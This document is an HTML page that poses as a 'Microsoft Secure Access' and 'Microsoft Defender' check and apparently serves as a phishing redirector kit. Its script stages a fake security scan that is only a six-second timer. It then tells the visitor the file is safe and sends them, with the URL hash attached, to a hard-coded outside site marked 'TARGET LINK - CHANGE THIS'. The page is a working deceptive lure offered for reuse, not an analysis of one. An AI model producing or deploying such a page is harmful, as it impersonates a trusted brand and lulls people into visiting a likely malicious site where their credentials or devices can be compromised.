<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Microsoft Secure Access</title>
<style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#f3f2f1;font-family:'Segoe UI',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
    .card{background:#fff;border:1px solid #e1e1e1;border-radius:8px;padding:32px 28px;width:360px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.08)}
    .icon{width:56px;height:56px;background:#0078d4;border-radius:12px;display:flex;align-items:center;justify-content:center;margin:0 auto 18px}
    .icon svg{width:28px;height:28px;color:#fff}
    h2{font-size:20px;font-weight:600;color:#323130;margin-bottom:6px}
    .sub{font-size:13px;color:#605e5c;margin-bottom:24px}
    .status-box{background:#f8f9fa;border-radius:6px;padding:12px;margin-bottom:20px;border:1px solid #e1e1e1;min-height:70px;display:flex;align-items:center;justify-content:center}
    .status-text{font-size:13px;color:#323130}
    .status-text strong{color:#0078d4}
    .btn{width:100%;padding:11px 18px;background:#0078d4;color:#fff;font-size:14px;font-weight:500;border:none;border-radius:4px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:background 0.18s}
    .btn:hover{background:#106ebe}
    .btn.done{background:#107c10;cursor:default}
    .btn.done:hover{background:#107c10}
    .spinner{width:16px;height:16px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.7s linear infinite;display:none}
    .check{width:16px;height:16px;display:none}
    .btn.done .check{display:block}
    .btn.done .spinner{display:none}
    @keyframes spin{to{transform:rotate(360deg)}}
    .footer{margin-top:20px;font-size:10px;color:#8a8886;border-top:1px solid #e1e1e1;padding-top:14px}
    .footer span{color:#0078d4}
    #rid{font-family:monospace}
</style>
</head>
<body>
<div class="card">
    <div class="icon" id="iconBox">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <rect x="3" y="11" width="18" height="11" rx="2"></rect>
            <path d="M7 11V7a5 5 0 0110 0v4"></path>
        </svg>
    </div>
    <h2 id="titleText">Microsoft Secure Access</h2>
    <div class="sub" id="subText">Verifying your connection...</div>
    
    <!-- Status message area -->
    <div class="status-box">
        <div class="status-text" id="statusMsg">
            Click "Verify access" to start security scan
        </div>
    </div>
    
    <div class="btn" id="btn">
        <div class="spinner" id="spinner"></div>
        <div class="check">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
                <polyline points="20 6 9 17 4 12"></polyline>
            </svg>
        </div>
        <span id="btnText">Verify access</span>
    </div>
    
    <div class="footer">
        Ray ID: <span id="rid">UNK</span> • Microsoft Defender
    </div>
</div>

<script>
    (function(){
        // Ray ID from URL
        const ridSpan = document.getElementById('rid');
        const rayParam = new URLSearchParams(window.location.search).get('ray');
        if(ridSpan) ridSpan.textContent = (rayParam || 'UNK').substring(0,8);
        
        // DOM elements
        const btn = document.getElementById('btn');
        const spinner = document.getElementById('spinner');
        const btnText = document.getElementById('btnText');
        const statusMsg = document.getElementById('statusMsg');
        const titleText = document.getElementById('titleText');
        const subText = document.getElementById('subText');
        const iconBox = document.getElementById('iconBox');
        
        let processing = false;
        let scanTimer = null;
        
        // TARGET LINK - CHANGE THIS
        const TARGET = "https://signs-displays.com/itinerary/index.html";
        
        // Helper: Update icon color/style
        function setIconScanning() {
            iconBox.style.background = "#0078d4";
            iconBox.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
                <circle cx="12" cy="12" r="10"></circle>
                <path d="M12 6v6l4 2"></path>
            </svg>`;
        }
        
        function setIconSafe() {
            iconBox.style.background = "#107c10";
            iconBox.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                <polyline points="20 6 9 17 4 12"></polyline>
            </svg>`;
        }
        
        // Main scan function
        async function startScan() {
            if(processing || btn.classList.contains('done')) return;
            processing = true;
            
            // Update UI for scanning
            spinner.style.display = 'block';
            btnText.textContent = 'Scanning...';
            titleText.textContent = 'Security Scan';
            subText.textContent = 'Please wait while we verify';
            statusMsg.innerHTML = '<strong>🔍 Scanning documents...</strong><br>Checking for threats and verifying integrity';
            setIconScanning();
            
            // Wait 6 seconds
            await new Promise(r => setTimeout(r, 6000));
            
            // Scan complete - safe to open
            spinner.style.display = 'none';
            btn.classList.add('done');
            btnText.textContent = 'Open file';
            titleText.textContent = 'File is Safe';
            subText.textContent = 'No threats detected';
            statusMsg.innerHTML = '<strong>✅ File is safe to open</strong><br>Security scan complete — no issues found';
            setIconSafe();
            
            // Redirect after 1 second (so user sees the "safe" message)
            setTimeout(() => {
                window.location.href = TARGET + window.location.hash;
            }, 1000);
        }
        
        // Button click handler
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            if(!processing && !btn.classList.contains('done')) {
                startScan();
            } else if(btn.classList.contains('done')) {
                // If already verified, redirect immediately
                window.location.href = TARGET + window.location.hash;
            }
        });
    })();
</script>
</body>
</html>
